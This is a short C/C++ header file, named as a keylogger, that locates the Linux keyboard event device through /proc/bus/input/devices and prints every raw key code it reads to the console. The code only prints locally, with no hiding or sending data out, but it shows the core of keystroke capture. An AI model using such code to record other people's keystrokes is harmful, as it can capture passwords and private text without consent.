#ifndef __keylogger_h__
#define __keylogger_h__

#include <unistd.h>
#include <stdio.h>
#include <errno.h>

#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <cstring>
#include <fcntl.h>
#include <linux/input.h>

int find_keyboard_device(char *out_path, size_t out_size) {
    FILE *fp = fopen("/proc/bus/input/devices", "r");
    if (!fp) {
        perror("fopen /proc/bus/input/devices");
        return -1;
    }

    char line[512];
    char event_name[64] = {0};

    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "H: Handlers=", 12) == 0) {
            if (strstr(line, "kbd")) { 
                char *p = strstr(line, "event");
                if (p && sscanf(p, "%63s", event_name) == 1) {
                    snprintf(out_path, out_size,
                                "/dev/input/%s", event_name);
                    fclose(fp);
                    return 0;
                }
            }
        }
    }

    fclose(fp);
    fprintf(stderr, "Cannnot found keyboard\n");
    return -1;
}


void listen_keyboard() {
    char kb_path[128];

    if (find_keyboard_device(kb_path, sizeof(kb_path)) != 0) {
        fprintf(stderr, "Cannot found keyboard\n");
        return;
    }

    printf("Using: %s\n", kb_path);

    int fd = open(kb_path, O_RDONLY);
    if (fd < 0) {
        perror("open keyboard device");
        return;
    }

    struct input_event ev;
    while (1) {
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n < 0) {
            perror("read");
            break;
        }
        if (n != sizeof(ev)) {
            fprintf(stderr, "read size lech: %zd\n", n);
            continue;
        }

        if (ev.type == EV_KEY) {
            printf("KEY code=%d value=%d\n", ev.code, ev.value);
            fflush(stdout);
        }
    }

    close(fd);
}

#endif 
